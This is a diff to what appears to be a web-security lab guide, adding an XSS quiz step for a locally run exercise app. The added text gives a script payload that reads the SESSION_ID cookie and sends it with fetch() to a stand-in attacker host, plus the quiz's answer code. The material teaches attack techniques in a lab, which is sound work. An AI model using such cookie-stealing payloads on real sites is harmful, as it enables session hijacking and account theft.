@@ -46,3 +46,11 @@
 
 - Run the script above and refresh the bank's page
 - You should see in the application window the code `setyourcorsheader`
+
+## Concept 12 XSS Quiz
+
+- Download L5-XSS-Binary Zip
+- Run the executable
+- Open a browser in incognito mode and go to `http://badwebsite.127.0.0.1.xip.io:8080/`
+- Use the following code `<script>fetch('http://badwebsite.127.0.0.1.xip.io:8080/?key='+ document.cookie.slice(document.cookie.indexOf('SESSION_ID')).split('=')[1])</script>`
+- - You should see in the application window the code `xkcd_327`
